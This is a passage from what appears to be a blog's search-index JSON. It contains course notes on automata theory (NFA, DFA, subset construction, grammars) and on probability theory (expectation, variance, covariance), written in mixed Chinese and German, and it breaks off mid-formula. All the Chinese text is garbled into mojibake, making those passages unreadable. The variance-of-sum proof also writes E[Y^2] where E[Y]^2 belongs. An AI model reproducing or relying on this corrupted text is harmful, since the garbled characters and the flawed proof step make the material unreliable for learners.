w1 \\notin L(A)å³$w \\in L(A) \\Leftrightarrow w\\text{ä¸ºå¶æ•°}$ã€‚ï¼ˆä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶çš„æœ€ä½ä½ç­‰äº0ï¼‰ å¦‚æœ$w = \\varepsilon$ï¼Œæœ‰$\\hat{\\delta}(0, \\varepsilon) = 0$ï¼Œæ‰€ä»¥$\\varepsilon \\in L(A)$ã€‚ï¼ˆæ³¨æ„ #$\\varepsilon = 0$ï¼‰$\\square$ Von rechtslinearen Grammatiken zu DFA (und zurÃ¼ck)Rechtslineare Grammatikï¼ˆå³Typ3ï¼‰æŒ‡çš„æ˜¯æ‰€æœ‰Produktionéƒ½é•¿è¿™æ ·ï¼š$A \\to a$ æˆ–è€…$A \\to aB$ã€‚ Definition:Ein nichtdeterministischer endlicher Automat (nondeterministic finite automaton, NFA) ist ein 5-Tupel$N = (Q, \\Sigma, \\delta, q_0, F)$, so dass$Q$, $\\Sigma$, $q_0$ und $F$ sind wie bei einem DFA $\\delta : Q \\times \\Sigma \\rightarrow \\mathcal{P}(Q)$ $\\mathcal{P}(Q)$ = Menge aller Teilmengen von $Q$ Alternative: Relation $\\delta \\subseteq Q \\times \\Sigma \\times Q$ æ³¨æ„ï¼Œåœ¨DFAé‡Œï¼Œæ¯ä¸€ä¸ªçŠ¶æ€ï¼ˆZustandï¼‰ä»¥åŠä¸€ä¸ªÃœbergangåªå¯¹åº”ä¸€ä¸ªçŠ¶æ€ï¼ˆZustandï¼‰ã€‚è€Œåœ¨NFAé‡Œï¼Œä¸€ä¸ªçŠ¶æ€ï¼ˆZustandï¼‰ä»¥åŠä¸€ä¸ªÃœbergangå¯ä»¥å¯¹åº”å¤šä¸ªçŠ¶æ€ã€‚ ä¾‹å­ï¼š æ¯ä¸€ä¸ªç‚¹å¯èƒ½ä¼šæ‹¥æœ‰å¤šæ¡ç›¸åŒåå­—çš„è¾¹ï¼Œæ‰€ä»¥ç»“æœæ˜¯ä¸ç¡®å®šçš„ã€‚ï¼ˆnichtdeterministisch ï¼‰ å½“æˆ‘ä»¬è¾“å…¥$0111$ï¼Œå¯èƒ½ä¼šå¾—åˆ°å¤šä¸ªZustandsfolgenï¼š p,p,p,p,p, \\ \\ \\ p,p,p,p,q \\ \\ \\ p,p,p,q,rå’Œä¹‹å‰ç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨$\\delta$çš„åŸºç¡€ä¸Šå®šä¹‰ \\begin{align*} \\bar{\\delta}: \\mathcal{P}(Q) \\times \\Sigma &\\to \\mathcal{P}(Q) \\\\ \\bar{\\delta}(S,a) :&= \\bigcup_{q \\in S} \\delta(q, a) \\end{align*}å¹¶åœ¨è¿™ä¸ªåŸºç¡€ä¸Šåƒä¹‹å‰ä¸€æ ·inductiveå®šä¹‰ \\hat{\\bar{\\delta}} : \\mathcal{P}(Q) \\times \\Sigma^* \\rightarrow \\mathcal{P}(Q)è€Œ$\\hat{\\delta}(S, w)$ å¯ä»¥ç†è§£æˆæ˜¯Menge aller ZustÃ¤nde, die sich von einem Zustand in $S$ aus mit $w$ erreichen lassen. ä¾‹å­ï¼š \\begin{aligned} \\hat{\\bar{\\delta}}(\\{p,q\\},10) &= \\hat{\\bar{\\delta}}(\\bar{\\delta}(\\{p, q\\}, 1), 0) \\\\ &= \\hat{\\bar{\\delta}}(\\delta(p, 1) \\cup \\delta(q, 1), 0) \\\\ &= \\hat{\\bar{\\delta}}(\\{p, q, r\\}, 0) \\\\ &= \\bar{\\delta}(\\{p, q, r\\}, 0) \\\\ &= \\delta(p, 0) \\cup \\delta(q, 0) \\cup \\delta(r, 0) \\\\ &= \\{p\\} \\cup \\{r\\} \\cup \\emptyset \\\\ &= \\{p, r\\} \\end{aligned}ä¹Ÿå°±æ˜¯è¯´ä»$p,q$å‡ºå‘ï¼Œè¿›è¡Œä¸€é$10$çš„æ“ä½œï¼Œæœ€åä¸€å®šä¼šè½åœ¨$p,r$ã€‚ Definition:Die von $N = (Q, \\Sigma, \\delta, q_0, F)$ akzeptierte Sprache ist:L(N) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(\\{q_0\\}, w) \\cap F \\neq \\emptyset \\} æ³¨æ„ï¼Œåœ¨DFAå®šä¹‰çš„akzeptierte Spracheé‡Œï¼Œæ˜¯ L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},è€Œåœ¨è¿™é‡Œï¼Œç”±äº$\\hat{\\delta}(q_0, w)$ æ˜¯å‡ ä¸ªé›†åˆï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ±‚çš„æ˜¯å®ƒå’Œ$F$çš„äº¤é›†ä¸ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦å­˜åœ¨åˆ°è¾¾çš„å¯èƒ½æ€§é‚£å°±ä¼šè¢«akzeptiertã€‚ ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬åç»­ä¸€èˆ¬è¿˜æ˜¯ç”¨$\\delta$ æŒ‡ä»£$\\bar{\\delta}$ ï¼Œ $\\hat{\\delta}$ æŒ‡ä»£$\\hat{\\bar{\\delta}}$ ã€‚ Theorem:FÃ¼r jede rechtslineare Grammatik $G$ gibt es einen NFA $N$ mit L(G) = L(N) ä¸»è¦çš„æ„é€ ï¼ˆè¯æ˜ï¼‰æ€è·¯å°±æ˜¯å°†Grammatiké‡Œçš„Variablen ï¼ˆVï¼‰æ„é€ æˆNFAçš„ZustÃ¤ndeï¼ˆQï¼‰ï¼Œç„¶åå°†Grammatikçš„Produktionæ„é€ æˆNFAé‡Œçš„ÃœbergÃ¤ngeã€‚ æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹é’ˆå¯¹ä¸‹é¢è¿™ä¸ªæ¯”è¾ƒallgemeinçš„ä¾‹å­çš„å…·ä½“æ„é€ ã€‚ ä¾‹å­ï¼š \\begin{aligned} S &\\rightarrow aX \\mid aY \\\\ X &\\rightarrow aX \\mid bY \\mid a \\\\ Y &\\rightarrow aS \\mid bX \\mid aY \\mid b \\end{aligned}è¯æ˜ï¼ˆæ„é€ ï¼‰ï¼š Sei $G = (V, \\Sigma, P, S)$ eine rechtslineare Grammatik ohne die Produktion $S \\rightarrow \\varepsilon$.Definiere den NFA $A = (Q, \\Sigma, \\delta, q_0, F)$ mit: $Q = V \\cup \\{q_f\\}$ (wobei $q_f \\notin V$) $Y \\in \\delta(X, a)$ gdw $(X \\rightarrow aY) \\in P$ $q_f \\in \\delta(X, a)$ gdw $(X \\rightarrow a) \\in P$ $q_0 = S$ $F = \\{q_f\\}$ Es gilt: $a_1 \\ldots a_n \\in L(G)$ â€“ gdw es existieren Variablen $X_1, \\ldots, X_{n-1}$ S \\rightarrow a_1X_1 \\rightarrow_G a_1a_2X_2 \\rightarrow_G \\cdots \\rightarrow_G a_1 \\ldots a_{n-1}X_{n-1} \\rightarrow_G a_1 \\ldots a_nâ€“ gdw es existieren ZustÃ¤nde $X_1, \\ldots, X_{n-1}$ \\delta(S, a_1) \\ni X_1,\\quad \\delta(X_1, a_2) \\ni X_2,\\quad \\ldots,\\quad \\delta(X_{n-1}, a_n) \\ni q_Fâ€“ gdw $a_1 \\ldots a_n \\in L(A)$ . $\\square$ å‡è®¾è¿™ä¸ªGrammatikè¿˜åŒ…å«äº†$S \\to \\varepsilon$ï¼Œé‚£ä¹ˆéœ€è¦å°†$F$æ„é€ æˆ$F= \\{S, q_f\\}$ã€‚ Theorem:FÃ¼r jeden NFA $N$ gibt es einen DFA $M$ mit L(N) = L(M) è¯æ˜ï¼š Sei $N = (Q, \\Sigma, \\delta, q_0, F)$ ein NFA.Definiere den DFA $M = (\\mathcal{P}(Q), \\Sigma, \\bar{\\delta}, \\{q_0\\}, F_M)$: F_M := \\{ S \\subseteq Q \\mid S \\cap F \\neq \\emptyset \\}Dann gilt: \\begin{aligned} w \\in L(N) &\\Leftrightarrow \\hat{\\bar{\\delta}}(\\{q_0\\}, w) \\cap F \\neq \\emptyset &\\text{Def.} \\\\ &\\Leftrightarrow \\hat{\\bar{\\delta}}(\\{q_0\\}, w) \\in F_M &\\text{Def.} \\\\ &\\Leftrightarrow w \\in L(M) &\\text{Def.} \\end{aligned}. $\\square$ è¿™ç§æ„é€ å«åš Potenzmengenkonstruktion æˆ–è€… Teilmengenkonstruktionã€‚ æ³¨æ„ï¼ŒæŒ‰ç…§è¿™ä¸ªæ„é€ ï¼Œå¦‚æœNFAé‡Œæœ‰nä¸ªZustÃ¤ndeï¼Œ é‚£å¯¹åº”çš„DFAé‡Œä¼šæœ‰$2^n$ä¸ªZustÃ¤ndeã€‚å¾ˆå¤šå½“ç„¶æ˜¯å¯ä»¥é¿å…è¿™ä¸ªè§„æ ¼çš„ï¼Œä½†æ˜¯æœ‰äº›æ—¶å€™å¹¶é¿å…ä¸äº†ã€‚åœ¨è¿™ä¸ªCorollaryä¹‹åæˆ‘ä»¬ä¼šçœ‹ä¸€ä¸ªé¿å…ä¸äº†çš„ä¾‹å­ã€‚ Corollary:FÃ¼r jede rechtslineare Grammatik $G$ gibt es einen DFA $M$ mit L(G) = L(M) ä¾‹å­ï¼š L_k := \\{ w \\in \\{0,1\\}^* \\mid \\text{das $k$-letzte Bit von } w \\text{ ist } 1 \\}ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œæ˜¯å€’æ•°ç¬¬$k$ä½ä¸º1ï¼Œä¸æ˜¯æ­£æ•°ã€‚ï¼‰ Ein NFA fÃ¼r diese Sprache: Lemma:Jeder DFA $M$ mit $L(M) = L_k$ hat mindestens $2^k$ ZustÃ¤nden. è¯æ˜ï¼š æˆ‘ä»¬éœ€è¦åšçš„æ˜¯è¯æ˜ fÃ¼r alle $w_1, w_2 \\in \\{0, 1\\}^k$: w_1 \\ne w_2 \\Rightarrow \\hat{\\delta}(q_0, w_1) \\ne \\hat{\\delta}(q_0, w_2)è¯æ˜äº†è¿™ä¸ªä¹‹åï¼Œç”±äº$\\{0, 1\\}^k$é‡Œæœ‰$2^k$ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆä»»æ„ä¸€ä¸ªDFAé‡Œä¹Ÿè‡³å°‘ä¼šæœ‰$2^k$ä¸ªZusÃ¤ndeï¼Œå› ä¸ºå¯¹äºæ‰€æœ‰çš„$w \\in \\{0, 1\\}^k$ï¼Œ$\\hat{\\delta}(q_0, w)$éƒ½æ˜¯$M$é‡Œçš„ä¸€ä¸ªZustandã€‚ é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å¼€å§‹è¯æ˜è¿™ä¸ªç»“è®ºï¼Œç”¨åè¯æ³•ï¼š Annahme: Es gibt $w_1, w_2 \\in \\{0, 1\\}^k$ mit $w_1 \\ne w_2$, aber $\\hat{\\delta}(q_0, w_1) = \\hat{\\delta}(q_0, w_2)$. Sei $w_1 = wa_i \\ldots a_k$ und $w_2 = wb_i \\ldots b_k$ mit $a_i \\ne b_i$ ï¼ˆ$i$è¡¨ç¤ºçš„æ˜¯$w_1,w_2$ç¬¬ä¸€ä¸ªä¸ç›¸ç­‰çš„ä½ã€‚è€Œå‰é¢ç›¸åŒçš„éƒ¨åˆ†æˆ‘ä»¬å°±ç®€å•è®°ä½œ$w$ã€‚ï¼‰o.E. sei $a_i = 1$, $b_i = 0$. Es gilt einerseits: \\begin{aligned} w_1 0^{i-1} &= wa_i \\ldots a_k 0^{i-1} \\in L_k \\\\ w_2 0^{i-1} &= wb_i \\ldots b_k 0^{i-1} \\notin L_k \\end{aligned}ï¼ˆåœ¨$w_1,w_2$åé¢åŠ ä¸Š$i-1$ä¸ª0ï¼Œè¿™æ ·ä¸€æ¥ç¬¬ä¸€ä¸ªçš„å€’æ•°ç¬¬$k$ä½å°±æ˜¯1ï¼Œç¬¬äºŒä¸ªçš„å€’æ•°ç¬¬$k$ä½æ˜¯0ã€‚ï¼‰ Aber es gilt auch: \\begin{aligned} \\hat{\\delta}(q_0, w_1 0^{i-1}) &= \\hat{\\delta}(\\hat{\\delta}(q_0, w_1), 0^{i-1}) \\\\ &= \\hat{\\delta}(\\hat{\\delta}(q_0, w_2), 0^{i-1}) \\quad \\text{nach der Annahme}\\\\ &= \\hat{\\delta}(q_0, w_2 0^{i-1}) \\end{aligned}ä½†æ˜¯æ ¹æ®$L(M)$çš„å®šä¹‰ï¼š L(M) := \\{ w \\in \\Sigma^* \\mid \\hat{\\delta}(q_0, w) \\in F \\},ä¸å¯èƒ½å­˜åœ¨$a,b$æ»¡è¶³$\\hat{\\delta}(q_0, a) = \\hat{\\delta}(q_0, b)$ï¼Œä½†æ˜¯ä¸€ä¸ªåœ¨$L(M)$ï¼Œä¸€ä¸ªä¸åœ¨ã€‚ æ‰€ä»¥è¯´å¾—åˆ°ä¸€ä¸ªWiederspruch. $\\square$ Theorem:FÃ¼r jeden DFA $M$ gibt es eine rechtslineare Grammatik $G$ mit L(M) = L(G) è¯æ˜ï¼š Sei $M = (Q, \\Sigma, \\delta, q_0, F)$.Die Grammatik $G = (V, T, P, S)$ mit: $V = Q$, $T = \\Sigma$, $S = q_0$ $(q_1 \\rightarrow aq_2) \\in P$ gdw $\\delta(q_1, a) = q_2$ $(q_1 \\rightarrow a) \\in P$ gdw $\\delta(q_1, a) \\in F$ $(q_0 \\rightarrow \\varepsilon) \\in P$ gdw $q_0 \\in F$ ist von Typ 3 und erfÃ¼llt $L(M) = L(G)$.$\\square$ NFAs mit $\\epsilon$-ÃœbergÃ¤ngenDefinition:Ein NFA mit $\\epsilon$-ÃœbergÃ¤ngen (auch $\\varepsilon$-NFA) ist ein NFA mit einem speziellen Symbol $\\epsilon \\notin \\Sigma$ und mit\\delta : Q \\times (\\Sigma \\cup \\{\\epsilon\\}) \\rightarrow \\mathcal{P}(Q).Ein $\\epsilon$-Ãœbergang darf ausgefÃ¼hrt werden, ohne dass ein Eingabezeichen gelesen wird. æ³¨æ„ï¼Œè¿™é‡Œçš„$\\epsilon$å’Œä¹‹å‰ç”¨çš„$\\varepsilon$æ˜¯ä¸ä¸€æ ·çš„ä¸œè¥¿ã€‚ $\\epsilon$ ist ein einzelnes Symbol, $\\varepsilon$ ist das leere Wort. ä¾‹å­ï¼š è¿™ä¸ª$\\varepsilon$-NFAå¯ä»¥æ¥å—$\\varepsilon,00,11,â€¦$ï¼Œä½†ä¸èƒ½æ¥å—$101,â€¦$ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªAutomatè™½ç„¶è¯»å–çš„æ˜¯$11$ï¼Œä½†å®ƒå¯ä»¥å…ˆï¼ˆâ€œå…è´¹â€ï¼‰è·³åˆ°$q_1$ï¼Œç„¶åå†è¿›è¡Œ2æ¬¡$1$çš„æ“ä½œã€‚ Lemma:FÃ¼r jeden $\\epsilon$-NFA $N$ gibt es einen NFA $Nâ€™$ mit L(N) = L(N'). è¯æ˜ï¼š Sei $N = (Q, \\Sigma, \\delta, q_0, F)$ ein $\\epsilon$-NFA.Wir definieren den NFA$Nâ€™ = (Q, \\Sigma, \\deltaâ€™, q_0, Fâ€™)$ mit folgenden Definitionen fÃ¼r $\\deltaâ€™$ und $Fâ€™$: $\\deltaâ€™ : Q \\times \\Sigma \\rightarrow \\mathcal{P}(Q)$ \\delta'(q, a) := \\bigcup_{i \\geq 0, j \\geq 0} \\hat{\\delta}(\\{q\\}, \\epsilon^i a \\epsilon^j) Falls $N$ das leere Wort $\\varepsilon$ akzeptiert, also falls \\exists i \\geq 0 : \\hat{\\delta}(\\{q_0\\}, \\epsilon^i) \\cap F \\neq \\emptysetdann setze $Fâ€™ := F \\cup \\{q_0\\}$, sonst setze $Fâ€™ := F$.$\\square$ ä¾‹å­ï¼š RegulÃ¤re AusdrÃ¼cke æ­£åˆ™è¡¨è¾¾å¼Berechenbarkeit, EntscheidbarkeitBegriffeå›¾çµæœº ï¼ˆTuring Maschineï¼‰ å¯ä»¥è¿™æ ·ç†è§£ï¼šæœºå™¨ä¼šï¼ˆä¾é ä¸€ä¸ªæ¢å¤´ read/write headï¼‰è¯»å–ä¸€æ¡Bandä¸Šçš„å†…å®¹ï¼Œç„¶åæ ¹æ®å½“å‰ä½ç½®è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š è°ƒæ•´å½“å‰ä½ç½® æ”¹å†™Bandå½“å‰ä½ç½®çš„å€¼ è°ƒæ•´æ¢å¤´ä½ç½®ï¼ˆå·¦/å³/ä¸åŠ¨ï¼‰","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"Theoretische Informatik ç†è®ºä¿¡æ¯å­¦","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/Theoretische-Informatik-ç†è®ºä¿¡æ¯å­¦","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Theoretische-Informatik-%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"}],"tags":[{"name":"Theoretische Informatik","slug":"Theoretische-Informatik","permalink":"https://archer-baiyi.github.io/tags/Theoretische-Informatik/"},{"name":"ç†è®ºä¿¡æ¯å­¦","slug":"ç†è®ºä¿¡æ¯å­¦","permalink":"https://archer-baiyi.github.io/tags/%E7%90%86%E8%AE%BA%E4%BF%A1%E6%81%AF%E5%AD%A6/"}]},{"title":"æ¦‚ç‡è®º Probability Theory","slug":"TUM  æ•°å­¦ ç¬”è®°/æ¦‚ç‡è®º/æ¦‚ç‡è®º-Probability-Theory","date":"2025-04-26T18:32:06.000Z","updated":"2025-07-14T22:54:56.369Z","comments":true,"path":"2025/04/26/TUM  æ•°å­¦ ç¬”è®°/æ¦‚ç‡è®º/æ¦‚ç‡è®º-Probability-Theory/","permalink":"https://archer-baiyi.github.io/2025/04/26/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E8%AE%BA/%E6%A6%82%E7%8E%87%E8%AE%BA-Probability-Theory/","excerpt":"æ¦‚ç‡è®ºç›¸å…³ç¬”è®°","text":"BasicsDefinition: Let $I \\subseteq \\mathbb{R}$. Let $X_t : \\Omega \\to \\mathbb{R}, t\\in I$, be random variables on the same probability space $(\\Omega. \\mathcal{F}, P)$. Then $X = (X_t)_{t \\in I}$ is called a real-valued stochastic process. Expected value / Expectation / Erwartungswert / æœŸæœ›Definition : Let $X$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$. The expectation of $X$ is defined by\\mathbb{E}[X] = \\int_{\\Omega}X(\\omega)P(d\\omega). Theorem: Let $X:\\Omega \\to S$ be a random variable on a probability space $(\\Omega,\\mathcal{F},P)$ with distribution $\\mu$ and let $g:S\\to \\mathbb{R}$ be a measurable function. Then\\mathbb{E}[g(X)] = \\int_{S}g(x)\\mu(dx). Corollary: If $X$ is a discrete random variable with values in $S$, then \\mathbb{E}[g(X)] = \\sum_{x \\in S}g(x)P(X=x). Corollary: If $X$ is a discrete random variable with values in $S \\subseteq \\mathbb{R}$, then \\mathbb{E}[X] = \\sum_{x \\in S}xP(X=x).Proof: Choose $g = id_S: S \\to S \\subseteq \\mathbb{R}$.$\\square$ Corollary: If $X : \\Omega \\to \\mathbb{R}^n$ has the probability density function (Verteilungsdichte) $f$, then for every Borel-measurable function $g : \\mathbb{R}^n \\to \\mathbb{R}$, the following holds: \\mathbb{E}[g(X)] = \\int_{\\mathbb{R}^n} g(x) f(x) \\, dx. Corollary: If $X$ has values in $\\mathbb{R}$ \\mathbb{E}[X] = \\int_{\\mathbb{R}} x f(x) \\, dx. Theorem (Linearity): Let $X,Y :\\Omega \\to \\mathbb{R}$ be random variables in $\\mathcal{L}^1$. Then\\mathbb{E}[aX+bY] = a\\mathbb{E}[X] + b\\mathbb{E}[Y] \\ \\ \\text{ for all }a,b \\in \\mathbb{R} Theorem: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables, $g,h: \\mathbb{R} \\to \\mathbb{R}$ be Borel-measurable function with $E[|g(X)|], E[|h(Y)|] &lt; \\infty$. Then\\mathbb{E}[g(X)h(Y)] = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. proof: Since $X$ and $Y$ are independent, the joint distribution of $(X, Y)$ is the product of the marginal distributions $P_X \\times P_Y$. Using Fubiniâ€™s theorem, we obtain \\begin{align*} \\mathbb{E}[g(X)h(Y)] &= \\int_{\\mathbb{R}} \\int_{\\mathbb{R}} g(x)h(y) \\, P_X(dx) P_Y(dy)\\\\ &= \\left( \\int_{\\mathbb{R}} g(x) \\, P_X(dx) \\right) \\left( \\int_{\\mathbb{R}} h(y) \\, P_Y(dy) \\right) = \\mathbb{E}[g(X)] \\mathbb{E}[h(Y)]. \\end{align*}$\\square$ Corollary: Let$X,Y :\\Omega \\to \\mathbb{R}$be independent random variables in $\\mathcal{L}^1$, then \\mathbb{E}[XY] = \\mathbb{E}[X] \\mathbb{E}[Y].MomentDefinition : $E[X^n]$is called the $n^{\\text{th}}$ moment of X. Theorem:Let $X \\sim \\mathcal{N}(\\mu,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[(X - \\mu)^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases}Here, $n!!$ denotes the double factorial, that is, the product of all numbers from $n$ to 1 that have the same parity as $n$. Corollary:Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable. Then for any non-negative integer $p$ we have:\\mathbb{E}[X^p] =\\begin{cases}0 & \\text{if } p \\text{ is odd}, \\\\\\sigma^p (p - 1)!! & \\text{if } p \\text{ is even}.\\end{cases} Example: Let $X \\sim \\mathcal{N}(0,\\sigma^2)$ be a random variable, we have: $\\mathbb{E}[X^2] = \\sigma^2$ $\\mathbb{E}[X^3] = 0$ $\\mathbb{E}[X^4] = 3 \\sigma^4$ Variance / Varianz / æ–¹å·®Definition: Let$X\\in \\mathcal{L}^1$. Then \\text{Var}(X) = \\mathbb{E}[(X-\\mathbb{E}(X))^2]is called the variance of$X$and \\sigma_X = \\sqrt{Var(X)}is the standard deviation of $X$. Theorem: Let$X\\in \\mathcal{L}^1$, then\\text{Var}(X) = \\mathbb{E}[X^2] - \\mathbb{E}[X]^2. proof: let $\\mu:=E[X]$. \\begin{align*} \\text{Var}(X) &= \\mathbb{E}[(X-\\mu)^2]\\\\ &= \\mathbb{E}[X^2-2\\mu X + \\mu^2]\\\\ &= \\mathbb{E}[X^2]-2\\mu E[X] + \\mu^2\\\\ &= \\mathbb{E}[X^2]- \\mu^2 \\end{align*}$\\square$ Theorem: Let $X$ be a random variable with finite expectation. For $a,b \\in \\mathbb{R}$, it holds that:\\text{Var}(aX + b) = a^2 \\text{Var}(X) proof: \\begin{align*} \\text{Var}(aX + b) &= \\mathbb{E}\\left[(aX + b - \\mathbb{E}[aX+b])^2\\right] \\\\ &= \\mathbb{E}\\left[(aX + b - (a\\mathbb{E}[X] + b))^2\\right] \\quad \\text{(by linearity)}\\\\ &= \\mathbb{E}\\left[a^2 (X - \\mathbb{E}[X])^2\\right] \\\\ &= a^2 \\text{Var}(X) \\end{align*}$\\square$ Theorem: Let $X,Y$ be independent random variables, then\\text{Var}(X + Y) = \\text{Var}(X) + \\text{Var}(Y) proof: \\begin{align*} \\text{Var}(X + Y) &= \\mathbb{E}[(X+Y)^2] - \\mathbb{E}[X+Y]^2 \\\\ &= \\mathbb{E}[X^2] + \\mathbb{E}[Y^2] - \\mathbb{E}[X]^2 - \\mathbb{E}[Y^2] \\quad \\text{(by independence)}\\\\ &= \\text{Var}(X) + \\text{Var}(Y) \\end{align*}$\\square$ Theorem:Let $X,Y$ be independent random variables, then Var(XY) = Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 Proof: \\begin{align*} Var(XY) &= \\mathbb{E}[X^2Y^2] - \\mathbb{E}[XY]^2\\\\ &=\\mathbb{E}[X^2]\\mathbb{E}[Y^2] - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= (Var(X) + \\mathbb{E}[X]^2)(Var(Y) + \\mathbb{E}[Y]^2) - \\mathbb{E}[X]^2\\mathbb{E}[Y]^2\\\\ &= Var(X)Var(Y) + Var(X)\\mathbb{E}[Y]^2 + Var(Y)\\mathbb{E}[X]^2 \\end{align*}. $\\square$ Covariance / åæ–¹å·®Definition :For real-valued random variables$X, Y \\in L^2$, the covariance of$X$and$Y$is defined by\\text{Cov}(X, Y) = \\mathbb{E}\\Bigl[(X - \\mathbb{E}[X])(Y - \\mathbb{E}[Y])\\Bigl] Theorem:(a) $\\text{Cov}(X, X) = \\text{Var}(X)$(b) $\\text{Cov}(X, Y) = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y]$(c) If $X$ and $Y$ are independent, then $\\operatorname{Cov}(X, Y) = 0$. Proof: (a) Clear from the definition. (b) By the linearity of expectation, it follows: \\text{Cov}(X, Y) = \\mathbb{E}[XY - X\\mathbb{E}[Y] - \\mathbb{E}[X]Y + \\mathbb{E}[X]\\mathbb{E}[Y]] = \\mathbb{E}[XY] - \\mathbb{E}[X]\\mathbb{E}[Y].(c) The claim follows from $\\mathbb{E}[XY] = \\mathbb{E}[X]\\mathbb{E}[Y]$.$\\square$ Theorem: Let $X_i, Y_j \\in L^2$, $a_i, b_j \\in \\mathbb{R}$, $1 \\leq i \\leq n$, $1 \\leq j \\leq m$. Then:(a) The covariance is bilinear:\\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, \\sum_{j=1}^{m} b_j Y_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{m} a_i b_j \\operatorname{Cov}(X_i, Y_j)(b)\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j)In particular:\\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + 2 \\operatorname{Cov}(X_1, X_2)(c) If $X_1, \\dots, X_n$ are uncorrelated, i.e., $\\operatorname{Cov}(X_i, X_j) = 0$ for all $i \\neq j$, then:\\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) = \\sum_{i=1}^{n} \\operatorname{Var}(X_i)This holds especially if $X_1, \\dots, X_n$ are independent. Proof: (a) Since $\\operatorname{Cov}(X, Y) = \\operatorname{Cov}(Y, X)$, it suffices to show linearity in the first argument. From the linearity of expectation, it follows: \\begin{align*} \\operatorname{Cov}\\left( \\sum_{i=1}^{n} a_i X_i, Y \\right) &= \\mathbb{E}\\left[ \\left( \\sum_{i=1}^{n} a_i X_i - \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i X_i \\right] \\right)(Y - \\mathbb{E}[Y]) \\right] \\\\ &= \\mathbb{E}\\left[ \\sum_{i=1}^{n} a_i (X_i - \\mathbb{E}[X_i])(Y - \\mathbb{E}[Y]) \\right] = \\sum_{i=1}^{n} a_i \\operatorname{Cov}(X_i, Y) \\end{align*}(b) Using part (a), we get: \\begin{align*} \\operatorname{Var}\\left( \\sum_{i=1}^{n} X_i \\right) &= \\operatorname{Cov}\\left( \\sum_{i=1}^{n} X_i, \\sum_{j=1}^{n} X_j \\right) = \\sum_{i=1}^{n} \\sum_{j=1}^{n} \\operatorname{Cov}(X_i, X_j) \\\\ &= \\sum_{i=1}^{n} \\operatorname{Var}(X_i) + \\sum_{\\substack{i,j=1\\\\i \\neq j}}^{n} \\operatorname{Cov}(X_i, X_j) \\end{align*}In the special case $n = 2$, this gives: \\operatorname{Var}(X_1 + X_2) = \\operatorname{Var}(X_1) + \\operatorname{Var}(X_2) + \\operatorname{Cov}(X_1, X_2) + \\operatorname{Cov}(X_2, X_1)(c) Follows from part (b).$\\square$ Moment generating functionDefinition: Let $X$ be a random variable such that $\\mathbb{E}[e^{tX}] &lt; \\infty$, then the moment generating function is defined as M_X(t) := \\mathbb{E}[e^{tX}].for all $t \\in \\mathbb{R}$. Theorem: Let $X \\sim N(\\mu,\\sigma^2)$, then the moment generating function exists and is equal to M_X(t) = e^{\\mu t + \\frac{\\sigma^2 t^2}{2}}.Clearly, if $X \\sim N(0,1)$, we haveM_X(t) = e^{\\frac{t^2}{2}}. Proof: Let $X \\sim N(\\mu,\\sigma^2)$, and f(x) := \\frac{1}{\\sqrt{2\\pi} \\sigma} e^{-\\frac{(x - \\mu)^2}{2\\sigma^2}}be its density function. Then, by definition we have \\begin{align*} M_X(t) = \\mathbb{E}[e^{tX}] &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} e^{tx} \\cdot e^{- \\frac{(x - \\mu)^2}{2\\sigma^2}}\\, dx \\\\ &= \\frac{1}{\\sqrt{2\\pi}\\sigma} \\int_{-\\infty}^{\\infty} \\exp\\left(tx - \\frac{(x - \\mu)^2}{2\\sigma^2} \\right)\\, dx \\end{align*}Notice that \\begin{align*} tx - \\frac{(x - \\mu)^2}{2\\sigma^2} &= tx - \\frac{1}{2\\sigma^2}(x^2 - 2\\mu x + \\mu^2) \\\\ &= tx - \\frac{x^2}{2\\sigma^2} + \\frac{\\mu x}{\\sigma^2} - \\frac{\\mu^2}{2\\sigma^2} \\\\ &= -\\frac{1}{2\\sigma^2}x^2 + \\left(t + \\frac{\\mu}{\\sigma^2}\\right)x - 